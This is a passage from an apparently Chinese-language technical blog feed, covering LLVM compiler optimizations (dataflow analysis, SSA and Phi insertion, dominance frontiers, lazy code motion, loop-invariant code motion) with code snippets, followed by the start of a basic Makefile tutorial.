<span class="comment">// 注：basicBlock不存在operator==函数，故只能比较其地址是否相同</span></span><br><span class="line">        <span class="keyword">if</span>(&amp;basicBlock == &amp;(*BBTraversalOrder(func).begin()))</span><br><span class="line">            <span class="comment">// 设置OUT[ENTRY]为空集，就是设置EntryBlock的IN集为空集</span></span><br><span class="line">            <span class="comment">// 注意基础块ENTRY和此处函数开头的基础块不是同一个</span></span><br><span class="line">            <span class="comment">// ENTRY -&gt; funcEntryBlock -&gt; ... -&gt; funcExitBlock -&gt; EXIT</span></span><br><span class="line">            ibv = BC();  <span class="comment">// BC 边界条件</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ibv = MeetOp(basicBlock);</span><br><span class="line">        <span class="comment">// 利用fB=fsn⋅…⋅fs2⋅fs1公式，遍历Instruction，计算出当前基础块的OUT集合</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> Instruction&amp; inst : InstTraversalOrder(basicBlock))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 对_inst_bv_map的修改在TransferFunc内</span></span><br><span class="line">            <span class="comment">// 传入旧的obv，判断是否修改out集。</span></span><br><span class="line">            obv = _inst_bv_map[&amp;inst];</span><br><span class="line">            <span class="comment">// TransferFunc的第三个参数感觉有点多余</span></span><br><span class="line">            transform |= TransferFunc(inst, ibv, obv);</span><br><span class="line">            <span class="comment">// 计算出的inst_out集合，是下一次transfer的in集合，所以需要赋值</span></span><br><span class="line">            ibv = obv;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transform;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>LLVM示例代码 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week7-8/Assignment2-Dataflow_Analysis/src/avail_expr.cpp" target="_blank" rel="noopener">github</a></p>
</blockquote>
<h3 id="c-静态单一赋值">c. 静态单一赋值</h3>
<h4 id="1-简介">1). 简介</h4>
<ul>
<li>
<p>静态单一赋值（static single assignment，SSA），可以归纳成如下语句：</p>
<blockquote>
<p>SSA是一种，每个变量在程序文本中最多分配一个值，的IR</p>
</blockquote>
<p>也就是说，非SSA形式的IR里一个变量可以赋值多次。<br>
SSA 简化了程序中变量的特性。<br>
为了得到SSA形式的 IR，初始 IR 中的变量会被分割成不同的版本（version），其中每个定义（definition）对应着一个版本。通常会在旧的变量名后加上下标构成新的变量名，这也就是各个版本的名字。<br>
显然，在 SSA 形式中，UD 链（Use-Define Chain）是十分明确的。也就是说，变量的每一个使用（use）点只有唯一一个定义可以到达。</p>
</li>
<li>
<p>SSA的优点：</p>
<ul>
<li>因为SSA使得每个变量都有唯一的定义，因此数据流分析和优化算法可以更加简单</li>
<li>使用-定义关系链所消耗空间从指数增长降低为线性增长。若一个变量有N个使用和M个定义，若不采用SSA，则存在M×N个使用-定义关系。</li>
<li>SSA中因为使用和定义的关系更加的精确，能简化构建干扰图的算法</li>
<li>源程序中对同一个变量的不相关的若干次使用，在SSA形式中会转变成对不同变量的使用，因此能消除很多不必要的依赖关系。</li>
<li>因为SSA使得依赖分析更加简单、精确，而且PHI节点中的变量不可能同时活跃。因此在SSA形式能协助完成寄存器分配。</li>
</ul>
</li>
</ul>
<h4 id="2-Phi">2). Phi</h4>
<ul>
<li>
<p><strong>Φ(Phi)</strong> 根据程序的执行流来确定赋的值是什么。请看如下IR代码</p>
<blockquote>
<p>LLVM IR 指令 <code>phi</code> 用于实现SSA中的PHI节点。在运行时，phi 指令根据“在当前 block 之前执行的是哪一个 predecessor(前驱节点) block”来得到相应的值。<br>
语法：<code>&lt;result&gt;</code> = phi [fast-math-flags] <code>&lt;ty&gt;</code> [ <code>&lt;val0&gt;</code>, <code>&lt;label0&gt;</code>], …<br>
在一个基本块中，<code>Phi</code>指令前不允许出现非<code>Phi</code>指令。</p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">  <span class="subst">%2</span> = icmp slt i32 <span class="subst">%0</span>, <span class="number">0</span></span><br><span class="line">  br i1 <span class="subst">%2</span>, label <span class="subst">%3</span>, label <span class="subst">%4</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>:                                                <span class="comment">; preds = %1</span></span><br><span class="line"><span class="symbol">  br label</span> <span class="subst">%5</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>:                                                <span class="comment">; preds = %1</span></span><br><span class="line"><span class="symbol">  br label</span> <span class="subst">%5</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>:                                                <span class="comment">; preds = %4, %3</span></span><br><span class="line">  <span class="comment">; 如果执行流通过%3分支，则x = 2; 否则如果;执行流通过%4分支，则x = 0</span></span><br><span class="line">  %.<span class="number">0</span> = phi i32 [ <span class="number">2</span>, <span class="subst">%3</span> ], [ <span class="number">0</span>, <span class="subst">%4</span> ]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：此函数并不是一条实际的指令，需要编译器后端对其做相应的处理，从而得到正确的汇编代码。此过程名为<code>resolution</code>。</p>
</blockquote>
</li>
<li>
<p>若需要启用<code>SSA</code>，则必须在<code>opt</code>命令中添加参数<code>-mem2reg</code>。</p>
<ul>
<li><code>mem2reg Pass</code>中的算法会使 alloca 这个仅仅作为 load 和 stores 的用途的指令使用迭代 dominator 边界转换成 PHI 节点，然后通过使用深度优先函数排序重写 loads 和 stores。</li>
<li>这种算法叫做 <code>iterated dominance frontier</code>算法，具体实现方法可以参看 PromoteMemToReg 函数的实现。</li>
</ul>
</li>
</ul>
<h4 id="3-如何生成SSA">3). 如何生成SSA</h4>
<ul>
<li>
<p>以下述代码为例，程序在函数体结尾会将x的值赋给y。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(x &lt; <span class="number">0</span>)</span><br><span class="line">    x = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> y = x;</span><br></pre></td></tr></table></figure>
<p>那么在代码优化时，我们并不知道赋值于y的值是多少。所以引进了 <strong>Φ(Phi)</strong> 函数，并重命名了变量</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注：其中的x1，x2的数字都是下标。其本质上还是x</span></span><br><span class="line"><span class="keyword">if</span>(x &lt; <span class="number">0</span>)</span><br><span class="line">    x1 = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    x2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> y = Φ(x1, x2);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>总结：三步走战略</p>
<ul>
<li>找出各个内含变量定值的基础块，以及这些基础块所对应的 <strong>支配边界</strong>
<blockquote>
<p>什么是支配边界？请阅读本文中 <strong>6. 流图中的循环 —— a. 支配结点与回边</strong> 的相关内容。</p>
</blockquote>
</li>
<li>插入PHI节点： PHI节点要插在控制流图的汇聚点处（joint point), 只要在汇聚点之前的分支中有针对某个变量的修改， 就需要在该汇聚点插入针对该变量的PHI节点。 PHI节点的操作数是分支路径中重新定义的变量。</li>
<li>变量重命名： 在插入PHI节点后，SSA中所有针对变量的定义就具备了，接下来就依次在定义处重命名变量，并替换对应的变量使用处。</li>
</ul>
</li>
<li>
<p>我们需要将 <strong>Φ</strong> 函数正确插入至代码块中。所以最关键的问题是 —— <strong>插入至何处？</strong></p>
<blockquote>
<p>插入至 <strong>各个变量定值所在的基础块集合</strong> 的 <strong>所有支配边界</strong> 。详见下面的算法。</p>
</blockquote>
</li>
</ul>
<h4 id="4-Φ-Phi-插入点算法">4). Φ(Phi)插入点算法</h4>
<p>伪代码如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @input   defsite内含某个变量赋值的所有基础块、DominanceFrontier某基础块的所有支配边界</span></span><br><span class="line"><span class="comment">// @output  Phi_list 插入点位置</span></span><br><span class="line"><span class="comment">// @brief   将Phi节点插入在各个变量定值基础块的所有支配边界上</span></span><br><span class="line">list getPhiList(defsite_list defsite, DominanceFrontier_List dominanceFrontier, var_list vars)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 初始状态下，Phi_list为空</span></span><br><span class="line">  Phi_list.empty();</span><br><span class="line">  <span class="comment">// 遍历所有变量</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> v <span class="keyword">in</span> vars)</span><br><span class="line">  &#123;</span><br><span class="line">    Worklist work_list;</span><br><span class="line">    <span class="comment">// 用内含该变量定值的基础块，对work_list初始化</span></span><br><span class="line">    work_list.initial(defsite[v]);</span><br><span class="line">    <span class="comment">// 如果work_list不是空的，那就继续循环</span></span><br><span class="line">    <span class="keyword">while</span>(work_list.no_empty())</span><br><span class="line">    &#123;</span><br><span class="line">      Work w = work_list.pop();</span><br><span class="line">      <span class="comment">// 遍历内含该变量赋值的基础块，其所有支配边界</span></span><br><span class="line">      <span class="keyword">for</span>(DominanceFrontier df <span class="keyword">in</span> dominanceFrontier[w])</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果该支配边界并没有被phi插入</span></span><br><span class="line">        <span class="keyword">if</span>(df not <span class="keyword">in</span> Phi_list)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 插入phi</span></span><br><span class="line">          Phi_list.push(df);</span><br><span class="line">          <span class="comment">// 如果插入失败（即，当前插入点既不在phi_list，也不在defsite中）</span></span><br><span class="line">          <span class="keyword">if</span>(df not <span class="keyword">in</span> union_of_sets(defsite[v], Phi_list))</span><br><span class="line">            <span class="comment">// 将该支配边界添加回work_list</span></span><br><span class="line">            work_list.push(df);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Phi_list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="5-参考">5) 参考</h4>
<ul>
<li><a href="https://blog.csdn.net/billleelh/article/details/9276031?utm_source=blogxgwz2" target="_blank" rel="noopener">编译器后端寄存器分配算法SSA</a></li>
<li><a href="https://blog.csdn.net/qq_29674357/article/details/78731713" target="_blank" rel="noopener">LLVM SSA介绍</a></li>
<li><a href="http://llvm.org/docs/LangRef.html#phi-instruction" target="_blank" rel="noopener">LLVM ‘phi’ Instruction</a></li>
<li><a href="https://blog.csdn.net/dashuniuniu/article/details/52224882" target="_blank" rel="noopener">构造Dominator Tree以及Dominator Frontier</a></li>
</ul>
<h2 id="6-流图中的循环">6. 流图中的循环</h2>
<h3 id="a-支配结点与回边">a. 支配结点与回边</h3>
<ul>
<li>
<p><strong>支配</strong>（Dominance）：如果每一条从流图的入口结点到结点 B 的路径都经过结点 A, 我们就说 A <strong>支配（dominate）</strong> B，记为 A dom B。<br>
其中，A和B都为 <strong>支配节点</strong>(Dominator)</p>
<blockquote>
<p>换言之， 如果A <strong>支配</strong> B，那么不可能不经过A就可以从入口处到达B。<br>
一个基础块永远 <strong>支配自己</strong>（ <strong>严格支配</strong> 排除支配自己这种情况）</p>
</blockquote>
</li>
<li>
<p><strong>直接支配节点</strong>(Immediate Dominator)： 从入口处节点到达节点n的所有路径上，结点n的 <strong>最后一个支配节点</strong> 称为 <strong>直接支配节点</strong>。</p>
</li>
<li>
<p><strong>支配边界</strong>（Dominance Frontier）：如果A支配了B的 <strong>任何</strong> 一个前驱基础块，但A并不 <strong>严格支配</strong> B，那么B就是A的支配边界</p>
<blockquote>
<p>支配边界确定了 Φ-function 的插入位置。由于每个definition支配对应的uses，所以如果达到了definition所在block的支配边界，就必须考虑其他路径是否有其他相同variable的定义，由于在编译期间无法确定会采用哪一条分支，所以需要放置 Φ-function</p>
</blockquote>
</li>
<li>
<p>下面的图给出了一个示例，给出了图中的支配结点以及支配边界关系。<br>
<img src="/2020/06/LLVM-IR-pass/1.jpg" alt="img"></p>
</li>
<li>
<p>一旦有了支配边界，我们便可以计算出 <strong>Φ</strong> 函数正确的插入位置。</p>
</li>
<li>
<p>LLVM获取支配边界的示例代码</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">getAnalysisUsage</span><span class="params">(AnalysisUsage &amp; AU)</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// Require that `DominanceFrontier` pass to run first before the</span></span><br><span class="line">  <span class="comment">// current pass (-&gt; Tutorial 2 Example 2 Pass Manager).</span></span><br><span class="line">  AU.addRequired &lt; DominanceFrontierWrapperPass &gt; ();</span><br><span class="line">  AU.setPreservesAll();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">runOnModule</span><span class="params">(Module&amp; M)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* ....... */</span></span><br><span class="line">  BasicBlock B = .....;</span><br><span class="line">  Function F = ......;</span><br><span class="line">  <span class="comment">/* ...... */</span></span><br><span class="line">  DominanceFrontier &amp; dom_frontier =</span><br><span class="line">      getAnalysis &lt;DominanceFrontierWrapperPass&gt; (F).getDominanceFrontier();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// DominanceFrontier::iterator指向了数据结构map</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    using DomSetMapType = std::map&lt;BlockT *, DomSetType&gt;; // Dom set map</span></span><br><span class="line"><span class="comment">    DomSetMapType Frontiers;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  DominanceFrontier::iterator dom_frontier_iter = dom_frontier.find(&amp;B);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> df_set_iter  = dom_frontier_iter-&gt;second.begin();</span><br><span class="line">            df_set_iter != dom_frontier_iter-&gt;second.end();</span><br><span class="line">          ++df_set_iter)</span><br><span class="line">  &#123;</span><br><span class="line">    (*df_set_iter)-&gt;printAsOperand(outs(), <span class="literal">false</span>); outs() &lt;&lt; <span class="string">", "</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* ....... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>回边(back edges)：假定流图中存在两个结点d和n满足d dom n。如果存在从结点n到d的有向边n -&gt; d，那么这条边称为回边。<br>
例子：<br>
<img src="/2020/06/LLVM-IR-pass/backEdgeExample.png" alt="img"></p>
</li>
</ul>
<h2 id="7-消除冗余">7. 消除冗余</h2>
<h3 id="a-基本知识">a. 基本知识</h3>
<ul>
<li>
<p>冗余：如果在通向位置p的每条代码路径上，表达式e都已经进行过求值，那么表达式e在位置p处是冗余的。<br>
部分冗余：如果表达式e在到达位置p的部分（而非全部）代码路径上是冗余的，则表达式eee在位置p处是部分冗余的。<br>
<img src="/2020/06/LLVM-IR-pass/redundancyExample.png" alt="img"></p>
</li>
<li>
<p>为了在很多执行路径中减少表达式被求值的次数，并保证不增加任何路径中的求值次数。我们可以通过移动各个对<code>x op y</code>求值的位置，并在必要时把求值结果保存在临时变量中，来完成这个目的。</p>
<blockquote>
<p>在流图中<code>x op y</code>被求值的 <strong>位置</strong> 可能增多,但只要对表达式求值的 <strong>次数</strong> 减少即可。</p>
</blockquote>
</li>
<li>
<p>我们期望所使用的部分冗余消除算法进行优化而得到的程序具有如下性质</p>
<ul>
<li>消除所有不复制代码就可消除的表达式冗余。</li>
<li>不应该执行任何在未优化时不执行的指令。
<blockquote>
<p>否则可能造成 <strong>非预期错误</strong></p>
</blockquote>
</li>
<li><strong>表达式的计算时刻尽量靠后</strong>
<blockquote>
<p>尽量靠后表达式的计算时刻可以降低该值的生命周期，降低使用寄存器的时间。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h3 id="b-懒惰代码移动">b. 懒惰代码移动</h3>
<h4 id="1-介绍">1). 介绍</h4>
<ul>
<li>以尽可能延迟计算为目标的部分冗余消除优化称为 <strong>懒惰代码运动</strong>（Lazy Code Motion）</li>
<li>流图的 <strong>关键边</strong>（Critical Edge）: 所有从一个具有多个后继节点到达另一个具有多个前驱节点的边。
<blockquote>
<p>通过在关键边上引入新的基本块，我们总是可以找到一个基本块作为放置表达式的适当位置来健减少冗余。<br>
仅靠增加基本块可能不足以消除所有的冗余计算，必要时需要复制代码，以便于将具有冗余特性的路径隔开。</p>
</blockquote>
</li>
</ul>
<h4 id="2-相关概念">2). 相关概念</h4>
<ul>
<li><strong>预期执行表达式</strong>：（Anticipated expression）如果从程序点p出发的所有路径最终都会计算表达式b+c的值，并且b和c在那时的值就是它们在点p上的值，则一个表达式b+c在程序点p上被 <strong>预期执行</strong>。
<blockquote>
<p>一个表达式的各个拷贝所放置的程序点必须 <em>预期执行</em> 此表达式</p>
</blockquote>
</li>
<li><strong>可用表达式</strong>（Will-be-Available Expressions）：一个表达式的多个拷贝会被分别放置到该表达式首次被预期执行的程序点上。如果原来的程序中所有到达程序点p的路径都预期执行这个表达式，则现在这个表达式在点p上<em>可用</em>。
<blockquote>
<p>这个分析的实质是活跃性分析（对表达式）。</p>
</blockquote>
</li>
<li><strong>可后延表达式</strong>（Postponable Expression）：在所有从程序入口结点到达p的路径中都会碰到一个位置较前的x+y，并且在最后一个这样的位置到p直接没有对x+y的使用，那么表达式x+y就可后延到程序点p上。</li>
<li><strong>被使用表达式</strong>(used expression) : 如果在基本块B的出口点被使用的表达式不在B的最后放置（latest）集合中，那么它也是一个在B入口点处被使用的表达式。</li>
<li>部分冗余消除中的四个数据流分析过程<br>
<img src="/2020/06/LLVM-IR-pass/lcm_data.png" alt="img"></li>
</ul>
<h4 id="3-算法">3). 算法</h4>
<ol>
<li>
<p>前提条件：已经计算出<em>e_gen</em>和<em>e_kill</em>集合</p>
</li>
<li>
<p>程序块的信息收集</p>
<blockquote>
<p>注：下文中的英文名全部指代某个特定集合。</p>
</blockquote>
<ol>
<li>使用<em>e_gen</em>、<em>e_kill</em>集合，计算预期执行表达式集合<em>anticipated</em>
<blockquote>
<p>预期执行表达式分析（逆向数据流分析）确定一个表达式是否在某个程序点<em>之后</em>的所有路径中被使用。</p>
</blockquote>
</li>
<li>使用<em>anticipated</em>、<em>e_kill</em>集合，计算可用表达式集合<em>available</em>
<blockquote>
<p>可用表达式分析（前向数据流分析）计算了一个表达式是否在<em>所有</em>路径中都在该点之前被<em>预期执行</em>。</p>
</blockquote>
</li>
<li>并通过<em>anticipated</em>、<em>available</em>表达式集合来计算出基本块B的所有最早放置位置集合<em>earliest</em>。
<blockquote>
<p>一个表达式的最前放置位置就是该表达式在其上被 <strong>预期执行</strong> 但 <strong>不可用</strong> 的程序点。</p>
</blockquote>
</li>
<li>使用<em>earliest</em>、<em>e_use</em>集合，计算可后延表达式集合<em>Postponable</em>
<blockquote>
<p>可后延表达式是通过前向数据流分析技术找出。</p>
</blockquote>
</li>
<li>根据<em>earliest</em>、<em>Postponable</em>、<em>e_use</em>集合计算出基本块B的所有最后放置位置集合<em>latest</em>
<blockquote>
<p>一个表达式的最后放置位置就是该表达式在其上 <strong>不可再后延</strong> 的程序点。</p>
</blockquote>
</li>
<li>根据<em>latest</em>、<em>e_use</em>集合，计算出被使用表达式集合<em>used</em>
<blockquote>
<p>除非一个临时赋值语句被<em>其后</em>的某条路径使用，否则该赋值语句可以被消除。被使用表达式是通过逆向数据流分析技术找出。</p>
</blockquote>
</li>
</ol>
</li>
<li>
<p>利用从数据流计算推导出的知识重写代码</p>
</li>
</ol>
<blockquote>
<p>详细算法较为复杂，若有兴趣请移步《编译原理》</p>
</blockquote>
<h4 id="4-参考">4). 参考</h4>
<ul>
<li><a href="https://blog.csdn.net/weixin_46222091/article/details/104743294" target="_blank" rel="noopener">编译器优化–6–代码移动</a></li>
<li>《编译原理》</li>
</ul>
<h3 id="c-循环不变量代码移动">c. 循环不变量代码移动</h3>
<ul>
<li>
<p><strong>循环不变量代码移动</strong>指的是把循环中的所有重复执行替换为循环外的单次计算,从而优化程序。<br>
具体操作就是将那些，所有操作数不在循环中改变的表达式，从循环内部移动到循环的<em>前置首结点</em>，避免重复计算。</p>
<blockquote>
<p><strong>前置首结点</strong>(preheader): 循环不变计算将被移至首结点之前，会创建一个称为<em>前置首结点</em>的新块。前置首结点的<em>唯一后继</em>是首结点，并且原来从循环L外到达L首结点的边都改成进入<em>前置首结点</em>。从循环L里面到达首结点的边不变<br>
<img src="/2020/06/LLVM-IR-pass/preheader.png" alt="img"></p>
</blockquote>
</li>
<li>
<p>循环不变量的判定条件： 某个变量如果其表达式的所有操作数都是常量，或者是循环外部的变量，或者是循环内部已经被标定为<em>循环不变量</em>的变量，那么这条表达式被称为<em>循环不变量</em>。</p>
</li>
<li>
<p>循环不变语句<code>s: x = y + z</code>移动的条件</p>
<ol>
<li>s所在的基本块是循环<strong>所有出口结点</strong>(有后继结点在循环外的结点)的<strong>支配结点</strong>
<blockquote>
<p>意味着控制流无论流向何处，都一定会执行语句s<br>
<img src="/2020/06/LLVM-IR-pass/licm_1.png" alt="img"></p>
</blockquote>
</li>
<li>循环中<strong>没有其它语句对x赋值</strong><br>
<img src="/2020/06/LLVM-IR-pass/licm_2.png" alt="img"></li>
<li>循环中对x的引用<strong>仅由s到达</strong><br>
<img src="/2020/06/LLVM-IR-pass/licm_3.png" alt="img"></li>
</ol>
</li>
<li>
<p>如何处理嵌套循环</p>
<ul>
<li>先处理内部循环。之后再处理外部循环，但此时只处理<em>属于外部但不属于内部循环</em>的表达式</li>
<li>在处理外部循环时，此时就可以进一部处理内部循环所外提的表达式了。</li>
</ul>
</li>
<li>
<p>计算循环不变计算的LLVM检测算法</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检查当前指令是否是循环不变量</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isInvariant</span><span class="params">(Instruction * I, Loop* loop)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> is_invariant = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 遍历操作数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> iter = I-&gt;op_begin(); is_invariant &amp;&amp; iter != I-&gt;op_end(); ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        Value* val = dyn_cast&lt;Value&gt;(*iter);</span><br><span class="line">        assert(val != <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 如果当前操作数不是一个常量，那可能是被标定为循环不变量或者其他</span></span><br><span class="line">        <span class="comment">// 如果是函数参数则可以视为循环体之外的不变量</span></span><br><span class="line">        <span class="comment">// 注意：这里的函数参数，指的是当前循环所在函数的函数参数，不是循环内部调用函数传入的参数</span></span><br><span class="line">        <span class="keyword">if</span>(!isa&lt;Constant&gt; (val) &amp;&amp; !isa&lt;Argument&gt;(val))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(Instruction* inst = dyn_cast&lt;Instruction&gt;(val))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 如果既不是循环不变量指令，也不是循环外的指令</span></span><br><span class="line">                <span class="keyword">if</span>(FOUND(markedAsInvariant, inst)</span><br><span class="line">                    &amp;&amp; loop-&gt;contains(inst-&gt;getParent()))</span><br><span class="line">                    <span class="comment">// 那么该操作数就不是循环不变量</span></span><br><span class="line">                    is_invariant = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 不是所有遍历到的操作数都是指令、常量和函数参数，可能也有基本块的Label等等</span></span><br><span class="line">                <span class="comment">// 其他情况下设置成false肯定没错</span></span><br><span class="line">                is_invariant = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> isSafeToSpeculativelyExecute(I)  <span class="comment">// 检查未定义错误，例如除以0。</span></span><br><span class="line">                                            <span class="comment">// 这一条指令可以帮助过滤PHI和跳转指令</span></span><br><span class="line">    &amp;&amp; !I-&gt;mayReadFromMemory()              <span class="comment">// 修改读取内存的指令，可能会导致结果值的改变，所以不予处理</span></span><br><span class="line">    &amp;&amp; !isa &lt; LandingPadInst &gt; (I)          <span class="comment">// 异常处理相关的指令，必须在循环内部</span></span><br><span class="line">    &amp;&amp; is_invariant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>对于循环不变量提取的代码优化，循环结构<code>do-while</code>可以非常完美的工作，不需要修改CFG</p>
<blockquote>
<p>原因是在消除冗余操作中，<strong>不应该执行任何在未优化时不执行的指令</strong>。<br>
而<code>do-while</code>语句保证了其循环体至少执行一次。这样优化代码时就可以不受此条件的限制。</p>
</blockquote>
<p>至于那些LICM无法直接处理的循环结构，为了保证循环结构中的循环不变表达式可以被优化，编译器通常将循环结构转化为<code>do-while</code>结构。例如：<code>while</code> ⇒ <code>if &amp; do-while</code></p>
</li>
</ul>
<blockquote>
<p>LLVM示例代码 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week7-8/Assignment3-Loop_Invariant_Code_Motion/LICM/loop_invariant_code_motion.cpp" target="_blank" rel="noopener">github</a></p>
</blockquote>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>Compiler</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Makefile的简单编写</title>
    <url>/2020/06/MakefileIntroduce/</url>
    <content><![CDATA[<h2 id="1-简介">1. 简介</h2>
<ul>
<li>在Unix下的代码编译中，Makefile指定了一系列代码编译的规则。</li>
<li>在编写好Makefile后，只需执行<code>make</code>便可轻松编译</li>
</ul>
<a id="more"></a>
<h2 id="2-规则">2. 规则</h2>
<p>Makefile以下述的规则编写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目标文件:依赖文件</span></span><br><span class="line"><span class="comment"># (tab)编译命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标文件：main</span></span><br><span class="line"><span class="comment"># 依赖文件：main.o add.o mul.o sub.o div.o</span></span><br><span class="line"><span class="comment"># 编译命令：g++ -o main add.o mul.o sub.o div.o main.o</span></span><br><span class="line">main:main.o add.o mul.o sub.o div.o</span><br><span class="line">  g++ -o main add.o mul.o sub.o div.o main.o</span><br></pre></td></tr></table></figure>
<h2 id="3-变量、符号与函数">3. 变量、符号与函数</h2>
<h3 id="a-变量的使用">a. 变量的使用</h3>
<ul>
<li>变量无需声明，可直接使用</li>
<li>若其他位置需要该变量时，则必须以<code>$(Variable)</code>的形式引用</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">VIR_A = A</span><br><span class="line">VIR_B = $(VIR_A) B</span><br></pre></td></tr></table></figure>
<h3 id="b-符号">b. 符号</h3>
<ul>
<li>
<p>赋值符号</p>
<ul>
<li>
<p><code>=</code> : <strong>最容易出错</strong> 的赋值等号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">VIR_A = A</span><br><span class="line">VIR_B = $(VIR_A) B</span><br><span class="line">VIR_A = AA</span><br></pre></td></tr></table></figure>
<p>最后<code>VIR_B</code>的值是<code>AA B</code>，而不是<code>A B</code>。<br>
在make时，会把整个makefile展开，最后决定变量的值</p>
</li>
<li>
<p><code>?=</code> : 如果没有被赋值过，则赋值等号后面的操作</p>
</li>
<li>
<p><code>+=</code> : 追加(append)</p>
</li>
<li>
<p><code>:=</code> : <strong>正常</strong> 的赋值</p>
</li>
</ul>
</li>
<li>
<p>特殊符号：</p>
<ul>
<li>
<p><code>%</code>  : 通配符</p>
</li>
<li>
<p><code>%0</code> : 执行时的第一个参数</p>
</li>
<li>
<p><code>$@</code> : 目标文件</p>
</li>
<li>
<p><code>$&lt;</code> : 第一个依赖文件</p>
</li>
<li>
<p><code>$^</code> : 所有的依赖文件</p>
</li>
<li>
<p><code>$$</code> : 与<code>$</code>等价</p>
</li>
<li>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a.out: a.c b.c</span><br><span class="line">  @<span class="built_in">echo</span> <span class="string">'$$@='</span><span class="variable">$@</span>  <span class="comment"># $@=a.out</span></span><br><span class="line">  @<span class="built_in">echo</span> <span class="string">'$$&lt;='</span>$&lt;  <span class="comment"># $&lt;=a.c</span></span><br><span class="line">  @<span class="built_in">echo</span> <span class="string">'$$^='</span>$^  <span class="comment"># $^=a.c b.c</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="c-内置函数">c. 内置函数</h3>
<blockquote>
<p>注：函数调用中不能在参数中添加空格，因为空格也会被视为参数的一部分</p>
</blockquote>
<ul>
<li>
<p><code>addprefix</code></p>
<ul>
<li>格式：$(addprefix <code>prefix</code>,<code>&lt;names...&gt;</code>)</li>
<li>功能：为文件序列添加前缀</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Variable := $(addprefix src/,foo bar)</span><br><span class="line"><span class="comment"># Variable ==&gt; src/foo src/bar</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>addsuffix</code></p>
<ul>
<li>格式：$(addsuffix <code>addsuffix</code>,<code>&lt;names...&gt;</code>)</li>
<li>功能：为文件序列添加后缀</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Variable := $(addsuffix .c,foo bar)</span><br><span class="line"><span class="comment"># Variable ==&gt; foo.c bar.c</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>basename</code></p>
<ul>
